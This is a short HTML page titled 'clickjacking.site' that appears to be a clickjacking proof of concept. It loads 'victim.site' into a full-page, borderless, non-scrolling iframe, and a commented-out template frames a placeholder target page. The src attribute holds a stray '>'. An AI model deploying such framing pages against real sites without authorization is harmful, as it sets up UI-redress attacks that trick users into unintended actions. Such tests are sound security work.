<!--
<html>
	<body>
		<frame src="[TargetPage]"> </frame>
	</body>
<html>
--> 

<!DOCTYPE HTML>
<html>
  <head>
    <title>clickjacking.site</title>
  </head>
  
  <style type="text/css">
      #myframe{
        width: 100%;
        height: 600px;
        border: none;
        position: absolute;
        top: 0px;
        bottom: 0px;
        left: 0px;
        right: 0px;    
      }
   </style>
   <body>
      <iframe id="myframe" src="http://victim.site/index.php>" scrolling="no"></iframe>
   </body>
</html>